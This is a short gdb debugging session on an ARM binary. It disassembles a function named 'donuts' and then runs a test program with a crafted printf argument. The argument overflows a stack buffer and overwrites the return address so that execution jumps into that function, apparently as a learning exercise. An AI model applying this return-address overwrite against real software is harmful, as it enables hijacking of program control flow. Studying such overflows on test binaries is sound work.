(gdb) disass donuts
Dump of assembler code for function donuts:
0x00008438 <donuts+0>:	push	{r11, lr}
0x0000843c <donuts+4>:	add	r11, sp, #4
0x00008440 <donuts+8>:	ldr	r0, [pc, #8]	; 0x8450 <donuts+24>
0x00008444 <donuts+12>:	bl	0x8368 <puts>
0x00008448 <donuts+16>:	mov	r0, #0
0x0000844c <donuts+20>:	bl	0x8374 <exit>
0x00008450 <donuts+24>:	andeq	r8, r0, r4, asr #10
End of assembler dump.
(gdb) r `printf "aaaabbbbcccc\xb4\x97\xdb\xbe\x38\x84\x00\x00"`
Starting program: /home/user/test `printf "aaaabbbbcccc\xb4\x97\xdb\xbe\x38\x84\x00\x00"`
Donuts...

Program exited normally.
(gdb) 
